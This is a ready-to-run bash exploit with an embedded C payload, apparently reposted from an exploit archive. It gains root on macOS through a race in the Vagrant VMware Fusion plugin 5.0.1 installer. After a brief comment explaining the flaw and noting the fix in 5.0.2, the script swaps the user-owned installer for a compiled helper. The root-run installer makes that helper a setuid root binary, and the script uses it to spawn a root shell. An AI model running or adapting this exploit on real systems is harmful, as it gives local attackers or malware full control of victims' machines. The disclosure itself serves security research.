# I recently blogged about how the installation process of version 5.0.0 of this
# plugin could be hihacked by a local attacker or malware in order to escalate
# privileges to root.  Hashicorp pushed some mitigations for this issue fairly
# quickly but unfortunately 5.0.1 is still exploitable with a slightly different
# approach.
  
# They removed the chmod/chown shell commands from their osascript invocation and
# instead simply executed their installer as root, but apparently didn't realise
# that the installer is not root-owned so can be swapped out by a local attacker
# during the process.
  
# This issue is fixed in version 5.0.2.
  
# https://m4.rkw.io/vagrant_vmware_privesc_5.0.1.sh.txt
# c38ecc9fdb4f37323338e8fd12b851133a2121f3505cde664e6d32f1ef49ba23
# -----------------------------------------------------------------------------
#!/bin/bash
echo "########################################"
echo "vagrant_vmware_fusion 5.0.1 root privesc"
echo "by m4rkw"
echo "########################################"
echo
echo "compiling..."
  
cat > vvf.c <<EOF
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
int main(int ac, char *av[])
{
  setuid(0);
  seteuid(0);
  if (ac > 1) {
    system("mv -f $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 /tmp/vvf_exp");
    system("chown root:wheel /tmp/vvf_exp");
    system("chmod 4755 /tmp/vvf_exp");
    system("mv -f $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64.orig $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64");
    system("$HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 install\012");
    return 0;
  }
  system("rm -f /tmp/vvf_exp");
  execl("/bin/bash","bash",NULL);
  return 0;
}
EOF
  
gcc -o /tmp/vvf_exp vvf.c
rm -f vvf.c
  
echo "waiting for user to initiate vagrant plugin update..."
  
while :
do
  r=`ps auxwww |grep '/usr/bin/osascript -e do shell script' |grep 'vagrant-vmware-installer_darwin_amd64'`
  if [ "$r" != "" ] ; then
    break
  fi
done
  
pid=`ps auxww |grep './vagrant-vmware-installer_darwin_amd64 install' |grep -v grep |xargs -L1 |cut -d ' ' -f2`
  
cd $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop
  
echo "dropping payload in place of installer binary..."
  
mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64
  
echo "waiting for payload to trigger..."
  
while :
do
  r=`ls -la /tmp/vvf_exp 2>/dev/null |grep -- '-rwsr-xr-x' |grep root`
  if [ "$r" != "" ] ; then
    echo "spawning shell..."
    /tmp/vvf_exp
    exit 0
  fi
done
 
#  0day.today [2023-02-20]  #
